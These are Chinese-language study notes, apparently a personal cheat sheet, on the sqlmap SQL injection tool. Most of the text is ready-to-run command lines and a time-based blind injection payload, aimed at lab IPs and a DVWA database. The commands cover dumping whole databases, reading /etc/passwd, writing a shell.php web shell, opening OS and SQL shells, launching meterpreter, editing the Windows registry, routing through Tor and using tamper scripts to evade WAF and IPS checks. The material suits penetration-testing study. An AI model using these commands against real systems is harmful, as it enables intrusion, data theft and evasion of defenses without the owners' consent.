---
### 最大线程

sqlmap默认最大线程数为10，可修改`lib\core`下的`settings.py`文件中的`MAX_NUMBER_OF_THREADS`

### 五种漏洞检测技术

- Boolean-based blind

- Time-based blind
	- 盲注：`' and (select * from (select(sleep(20)))a)#`

-  Error-based
    - 适用于WEB应用返回DBMS报错信息

-  UNION query-based
    - Web应用程序通过for循环中的select语句输出全部数据（否则首条记录）

-  Stacked queries
    - 堆叠多个查询语句（用;隔开多个语句）
    - 适用于非select的数据库修改、删除操作（文件访问、RCE）

- Inline queries(用的很少)

### 其他特性

- 直接读取BurpSuite日志、结合google自动搜索执行检查

- 支持Get、Post、Cookie、User-Agent、Refer检测

- 多线程（指定最大并发数、间隔时间、性能优化）

- 扫描期间自动处理Set-Cookie头，更新cookie

	`--drop-set-cookie`可以用来忽略`Set-Cookie`

- 支持身份认证、代理、定制头、解析表单

- 保存会话、断点续扫

- 配置文件

- 数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称

- 文件上传下载、UDF、存储过程、OS命令执行、访问windows注册表

- 集成于 w3af、metasploit，基于数据库服务进程提权和上传执行后门

---
### 直接榨取所有数据

- sqlmap -d "mysql://user:pass@192.168.1.14:3306/dvwa" -f --users -b --dbs --schema -a -v 6

- dbms://user:pass@dbms_ip:dbms_port/database_name

- dbms://database_filepath(sqlite, microsoft Access, firebird)

- `-f`  # fingerprint

- `-b`  # banner

- `-a`  # 榨取所有数据

- `-v`  # 输出信息详细度（0-6）

---
### 扫描漏洞

- `sqlmap -u "URL" --cookie = "..." -f -b --current-user`

- `sqlmap -m list.txt`                  # url 列表文件

- `sqlmap -g "inurl:\".php?id=a\""`     # google搜索

- `sqlmap -r request.txt`               # 读取文件

- `sqlmap -u "URL" --data="u=a&p=b"`    # post请求  其中data里如果用`;`之类的来连接参数的话，可以用`--param-del=";"`来标明

- `--method=PUT`                        # 指定HTTP方法

- `sqlmap -l log.txt`                   # Burpsuite日志

- `sqlmap -x http://192.168.1.12/sitemap.xml`   # 搜索引擎

- `sqlmap -u "https://192.168.1.12/a.php?id=1" --force-ssl` # 支持https

- `--cookie`            # set-cookie选择提示
    - `--cookie-del=","`    # 键值对分隔符（默认是`;`）
    - `--drop-set-cookie`   # 禁用服务器Set-Cookie头
    - `--load-cookies=`     # 读取cookie文件
    - `level >= 2`          # 检查cookie注入点 默认不会检查cookie是否有SQL注入
- `--user-agent`        # UA头文件（level >= 3时会检查`user-agent`是否有sql注入）
    - `--random-agent`  # 随机UA（/usr/share/sqlmap/txt/ua.txt）

- `--host`              # 指定Host头（level = 5时才会检查`host`是否存在sql注入)

- `--referer`           # 指定referer（level >= 3时会检查`referer`是否存在sql注入)

- `--headers`           # 指定其他头

---
### Sqlmap注入

- `-p/ --skip`          # 指定/忽略注入检查的参数

    > `sqlmap -u "http://targeturl/param1/value1*/param2/value2*/"`     # REST格式的测试注入

- `--dbms`              # 指定数据库类型

- `--os`                # linux / windows

- `--invalid-bignum / --invalid-logical/ --invalid-string`              # 取错值

- `--no-cast`           # 老版本需要关闭cast功能

- `--no-escape`         # 禁用字符编码转义（默认开启）
    > `select 'foo'`    # select char(102)+char(111)+char(111) 

- `--prefix/ --suffix`  # 前缀后缀
    ```
    $query = "SELECT * FROM users WHERE id = ('" $_GET['id'] "');
    sqlmap -u "http://192.168.1.11/a.php?id=1" -p id --prefix "')" --suffix "AND ('a'='a"
    $query = SELECT * FROM users WHERE id = ('1') <PAYLOAD> AND ('abc'='abc');
    再SQLMAP无法自动识别SQL语法边界时，手动指定PAYLOAD前后缀
    常见于嵌套JOIN查询场景
    ```

- `--temper="between, randomcase"`  # 使用脚本
    ```
    SQLMAP本身不混淆PAYLOAD         # 除CHAR()编码单引号内容
    tamper/PAYLOAD混淆处理脚本      # 可用自己编写脚本
    用于逃避IPS、WAF检查
    ```

- `--level`         # 等级1-5（更多payload：xml/payload/。更多注入点：cookie注入、referer注入、useragent注入等）

- `--risk`          # 风险1-4

- `--string/--not-string/--regexp/--code/--text-only/--titles`      # 基于盲注判断真假的依据来源

---
### 杂

- 身份认证
    - `--auth-type`         # Basic、Digest、NTLM
    - `--auth-cred`         # username:password
    - `--auth-file`         # 客户端私钥证书PEM文件
    - `--ignore-401`        # 忽略认证失败

- HTTP(S)代理
    - `--proxy`             # http://url:port
    - `--proxy-cred`        # username:password
    - `--proxy-file`        # 代理服务器列表
    - `--ignore-proxy`      # 忽略系统级代理

- Tor匿名代理
    - `--tor`               # 使用Tor匿名网络
    - `--tor-port`          # 9050/9150
    - `--tor-type`          # SOCKS5、SOCKS4、HTTP
    - `--check-tor`         # 检查Tor网络连接

- `--delay`                 # 每次请求间延迟hi（小数秒，默认0）

- `--timeout`               # 超时时间（小数秒，默认30）

- `--retries`               # 重试次数（默认3）

- `--randomize`             # 每次随机取值的参数（长度不变）

- `--scope`                 # 筛选代理日志，指定扫描目标，过滤burpsuite的日志
    - `sqlmap -l burp.log --scope="(www)?\.lab\.(com|net|org)"`

- `--safe-url/--safe-post/--safe-req/--safe-freq`
    - 重试多次错误后进行一次正确请求

- `--skip-urlencode`        # 服务器要求URL未编码

- `--csrf-token/--csrf-url` # 绕过anti-CSRF

- `--eval`                  # 自动验签（请求前执行代码）
    -  `sqlmap -u "http://192.168.1.12/a.php?id=1&hash=c4ca428234238cdd..." --eval="import hashlib; hash=hashlib.md5(id).hexdigest()"`

- `--time-sec`              # 基于时间盲注的延迟响应时间（默认5秒）

- `--union-cols`            # 指定联合查询列范围（12-16，默认1-10）（默认的话还会受--level的映像）

- `--union-char`            # 联合查询中指定替代NULL的数值

- `--union-from`            # 联合查询时指定表名（通常为当前表）

- `--dns-domain`            # 仅用于Time盲注（Error、Union可用时会直接跳过）

- `--second-order`          # **A页注入 B页反映结果（URL）**

- `--flush-session`         # **清空会话目录**

- `--purge-output`          # 清空output目录

- `--fresh-queries`         # 忽略session查询结果

- `--hex`                   # 将非ASCII内容编码为16进制后dump

- `--save`                  # **将命令保存成配置文件**

- `--parse-errors`          # 服务器开启DEBUG时收集报错信息
---

- `-s`                      # sqlite会话文件保存位置

- `-t`                      # 流量文件保存位置（debug用）

- `--batch/--answers`       # 批处理（默认选项）

- `--charset`               # Content-Type/第三方库
    - `--charset=GBK`   # 设定编码

- `--crawl/ --crawl-exclude`    # 指定起点爬网
    - `--batch --crawl=3`

- `--csv-del`               # dump数据分隔符

- `--dbms-cred`             # 数据库账号密码
---

- `--dependencies`          # **sqlmap检查依赖**

- `--hpp`                   # HTTP parameter pollution

- `--identify-waf`          # **识别WAF**

- `--mobile`                # **模拟移动设备**，就是设置UA，可以选择几种收集UA设置

- `--offline`               # 使用sesson文件（0网络连接）

- `--wizard`                # 向导

---
### 性能优化

- `--predict-output`        # /usr/share/sqlmap/txt/common-outputs.txt
    - 对返回结果匹配预设输出表，提高检测效率
    - 版本名、用户名（密码、权限、角色）数据库名称、表明、列明
    - 与`--threads`参数不兼容

- `--keep-alive`            # http(s)长连接，不兼容`--proxy`

- `--null-connection`       # 通过响应判断真假，适用于盲注（根据response的http头部返回的状态码、长度等不同而判断，不需要接收response body）
    - Range/ HEAD       # 降低带宽，不兼容`--text-only`

- `-o`                      # 以上三个参数全部

- `--threads`               # 最大并发请求数（最大10）
    - 不兼容`--predict-output`

---
### 榨取数据

- `-T users -D dvwa -C user -dolumns --search`

- `--schema --exclude-sysdbs`

- `--count/ --dump/ --start 1 --stop 3/ --first 3/ --last 5/ --where="id > 3"`

- `--dump-all --exclude-sysdbs`

- `--sql-query/ --sql-shell`        # 执行任意SQL语句（受服务器技术约束）
    > `--sql-query "select * from users"

- `--common-tables / --common-columns`      # 字典爆破

- `--udf-inject / --shared-lib`             # MySql/PostgresSql

---
### 文件访问

- `--file-read="/etc/passwd"`

- `--file-write="shell.php" --file-dest "/tmp/shell.php"`

- `--os-cmd/ --os-shell/ --sql-shell`
    - `mysql、postgresql`   # `sys_exec()、sys_eval() UDF`
    - `mssql`               # `xp_cmdshell`

### 带外连接

- 交互命令行、meterpreter、VNC          # 依赖**metasploit**

- `--os-pwn、--os-smbrelay(MS08-068)、--os-bof(MS09-004)`

### Windows注册表       # MySql、PostgresSql、MsSql

- `--reg-read/ -reg-add/ -reg-del`

- `--reg-key/ --reg-value/ --reg/data/ --reg-type`

- `sqlmap -u "http://192.168.1.12/a.php?id=1" --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1`




